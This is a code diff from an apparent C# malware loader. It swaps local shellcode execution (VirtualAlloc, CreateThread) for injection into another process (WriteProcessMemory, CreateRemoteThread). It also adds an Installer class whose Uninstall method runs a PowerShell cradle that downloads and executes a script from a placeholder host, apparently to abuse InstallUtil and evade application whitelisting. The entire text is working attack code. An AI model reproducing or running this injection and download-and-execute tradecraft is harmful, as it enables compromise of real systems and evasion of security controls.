@@ -1,21 +1,29 @@
+byte[] decoded = decoder(buf, 2, 0xFF);
 
-            for (int i = 0; i < banditbits.Length; i++)
-            {
-                banditbits[i] = (byte)(((uint)banditbits[i] - 5) & 0xFF);
-            }
+IntPtr outSize;
+WriteProcessMemory(hProcess, addr, decoded, buf.Length, out outSize);
 
-            int size = banditbits.Length;
-
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
-
-            Marshal.Copy(banditbits, 0, addr, size);
-
-            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
+IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
         }
     }
+
+    [System.ComponentModel.RunInstaller(true)]
+public class Sample : System.Configuration.Install.Installer
+
+{
+    public override void Uninstall(System.Collections.IDictionary savedState)
+    {
+	String cmd1 = "IEX (New-Object System.Net.WebClient).DownloadString('http://X.X.X.X/run.txt')";
+    Runspace rs = RunspaceFactory.CreateRunspace();
+    rs.Open();
+
+        PowerShell ps = PowerShell.Create();
+        ps.Runspace = rs;
+
+        ps.AddScript(cmd1);
+	ps.Invoke();
+
+	rs.Close();
+	}
 }
-
-      
-
+}
